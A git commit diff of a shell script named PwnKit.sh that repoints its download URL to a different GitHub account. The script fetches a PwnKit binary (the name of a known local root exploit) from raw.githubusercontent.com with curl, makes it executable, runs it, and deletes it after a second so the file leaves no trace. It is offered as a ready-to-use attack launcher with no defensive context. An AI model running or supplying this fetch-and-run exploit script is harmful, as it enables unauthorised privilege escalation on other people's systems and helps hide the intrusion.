2b401afbcf3ae67498d091e684c0cc2f0af27bbc
bt user center <122502119+btUserCenter@users.noreply.github.com>
2023-01-12 12:36:42 +0800

    Update PwnKit.sh

--- PwnKit.sh
+++ PwnKit.sh
@@ -1,4 +1,4 @@
-curl -fsSL https://raw.githubusercontent.com/ganlinniangwtf/PwnKit/main/PwnKit -o PwnKit || exit
+curl -fsSL https://raw.githubusercontent.com/btUserCenter/PwnKit/main/PwnKit -o PwnKit || exit
 chmod +x ./PwnKit || exit
 (sleep 1 && rm ./PwnKit & )
 ./PwnKit
